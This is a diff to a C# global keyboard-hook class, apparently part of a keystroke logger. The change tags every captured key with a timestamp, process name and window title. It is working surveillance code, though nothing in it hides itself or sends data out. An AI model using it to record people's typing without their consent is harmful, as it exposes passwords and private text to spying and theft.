@@ -1,11 +1,16 @@
 ﻿using System;
+using System.Threading.Tasks;
+using System.Text;
 using System.Diagnostics;
 using System.Windows.Input;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
+using System.ComponentModel;
 
 namespace Logger.Keyboard
 {
+    using WindowHandle = IntPtr;
+
     /// <summary>
     /// Listens keyboard globally.
     /// 
@@ -45,9 +50,11 @@ namespace Logger.Keyboard
         /// Fired when any of the keys is released.
         /// </summary>
         public event RawKeyEventHandler KeyUp;
- 
+
         #region Inner workings
- 
+
+        private const int MaxTitleSize = 300;
+
         /// <summary>
         /// Hook ID
         /// </summary>
@@ -59,7 +66,7 @@ namespace Logger.Keyboard
         /// <param name="character">Character</param>
         /// <param name="keyEvent">Keyboard event</param>
         /// <param name="vkCode">VKCode</param>
-        private delegate void KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character);
+        private delegate void KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character, DateTime dateTime, WindowHandle windowHandle, uint processID);
  
         /// <summary>
         /// Actual callback hook.
@@ -74,20 +81,24 @@ namespace Logger.Keyboard
         private IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam)
         {
             string chars = "";
- 
+
             if (nCode >= 0)
+            {
                 if (wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN ||
                     wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYUP ||
                     wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN ||
                     wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYUP)
                 {
-                    // Captures the character(s) pressed only on WM_KEYDOWN
-                    chars = WinAPI.VKCodeToString((uint)Marshal.ReadInt32(lParam), 
-                        (wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN ||
-                        wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN));
- 
-                    hookedKeyboardCallbackAsync.BeginInvoke((WinAPI.KeyEvent)wParam.ToUInt32(), Marshal.ReadInt32(lParam), chars, null, null);
+                    bool isKeyDown = wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN || wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN;
+
+                    WindowHandle windowHandle;
+                    uint processID;
+
+                    chars = WinAPI.VKCodeToString((uint)Marshal.ReadInt32(lParam), isKeyDown, out windowHandle, out processID);
+
+                    hookedKeyboardCallbackAsync.BeginInvoke((WinAPI.KeyEvent)wParam.ToUInt32(), Marshal.ReadInt32(lParam), chars, DateTime.Now, windowHandle, processID, null, null);
                 }
+            }
             
             return WinAPI.CallNextHookEx(hookId, nCode, wParam, lParam);
         }
@@ -108,39 +119,45 @@ namespace Logger.Keyboard
         /// <param name="keyEvent">Keyboard event</param>
         /// <param name="vkCode">VKCode</param>
         /// <param name="character">Character as string.</param>
-        void KeyboardListener_KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character)
+        void KeyboardListener_KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character, DateTime dateTime, WindowHandle windowHandle, uint processID)
         {
-            switch (keyEvent)
+            string processName = GetProcessName(processID);
+
+            StringBuilder windowTitle = new StringBuilder(MaxTitleSize);
+            WinAPI.GetWindowText(windowHandle, windowTitle, MaxTitleSize);
+
+            var eventArgs = new RawKeyEventArgs(vkCode, character, DateTime.Now, processID, processName, windowHandle, windowTitle.ToString());
+
+            if (keyEvent == WinAPI.KeyEvent.WM_KEYDOWN || keyEvent == WinAPI.KeyEvent.WM_SYSKEYDOWN)
             {
-                // KeyDown events
-                case WinAPI.KeyEvent.WM_KEYDOWN:
-                    if (KeyDown != null)
-                        KeyDown.BeginInvoke(this, new RawKeyEventArgs(vkCode, false, character), null, null);
-                    break;
-                case WinAPI.KeyEvent.WM_SYSKEYDOWN:
-                    if (KeyDown != null)
-                        KeyDown.BeginInvoke(this, new RawKeyEventArgs(vkCode, true, character), null, null);
-                    break;
- 
-                // KeyUp events
-                case WinAPI.KeyEvent.WM_KEYUP:
-                    if (KeyUp != null)
-                        KeyUp.BeginInvoke(this, new RawKeyEventArgs(vkCode, false, character), null, null);
-                    break;
-                case WinAPI.KeyEvent.WM_SYSKEYUP:
-                    if (KeyUp != null)
-                        KeyUp.BeginInvoke(this, new RawKeyEventArgs(vkCode, true, character), null, null);
-                    break;
- 
-                default:
-                    break;
+                KeyDown?.BeginInvoke(this, eventArgs, null, null);
+            }
+            else if (keyEvent == WinAPI.KeyEvent.WM_KEYUP || keyEvent == WinAPI.KeyEvent.WM_SYSKEYUP)
+            {
+                KeyUp?.BeginInvoke(this, eventArgs, null, null);
             }
         }
- 
+
+        string GetProcessName(uint processID)
+        {
+            Process process = null;
+
+            try
+            {
+                process = Process.GetProcessById(Convert.ToInt32(processID));
+            }
+            catch (Exception exception)
+            {
+                Program.Trace($"Couldn't get process with ID { processID }: { exception.Message }");
+            }
+
+            return process.TryGetFriendlyProcessName();
+        }
+
         #endregion
- 
+
         #region IDisposable Members
- 
+
         /// <summary>
         /// Disposes the hook.
         /// <remarks>This call is required as it calls the UnhookWindowsHookEx.</remarks>
@@ -169,11 +186,6 @@ namespace Logger.Keyboard
         public Key Key;
  
         /// <summary>
-        /// Is the hitted key system key.
-        /// </summary>
-        public bool IsSysKey;
- 
-        /// <summary>
         /// Convert to string.
         /// </summary>
         /// <returns>Returns string representation of this key, if not possible empty string is returned.</returns>
@@ -186,19 +198,33 @@ namespace Logger.Keyboard
         /// Unicode character of key pressed.
         /// </summary>
         public string Character;
- 
+
+        public DateTime DateTime;  
+
+        public uint ProcessID;
+
+        public string ProcessName;
+
+        public WindowHandle WindowHandle;
+
+        public string WindowTitle;
+
         /// <summary>
         /// Create raw keyevent arguments.
         /// </summary>
         /// <param name="VKCode"></param>
         /// <param name="isSysKey"></param>
         /// <param name="Character">Character</param>
-        public RawKeyEventArgs(int VKCode, bool isSysKey, string Character)
+        public RawKeyEventArgs(int VKCode, string Character, DateTime DateTime, uint ProcessID, string ProcessName, WindowHandle WindowHandle, string WindowTitle)
         {
             this.VKCode = VKCode;
-            this.IsSysKey = isSysKey;
             this.Character = Character;
             this.Key = System.Windows.Input.KeyInterop.KeyFromVirtualKey(VKCode);
+            this.DateTime = DateTime;
+            this.ProcessID = ProcessID;
+            this.ProcessName = ProcessName;
+            this.WindowHandle = WindowHandle;
+            this.WindowTitle = WindowTitle;
         }
  
     }
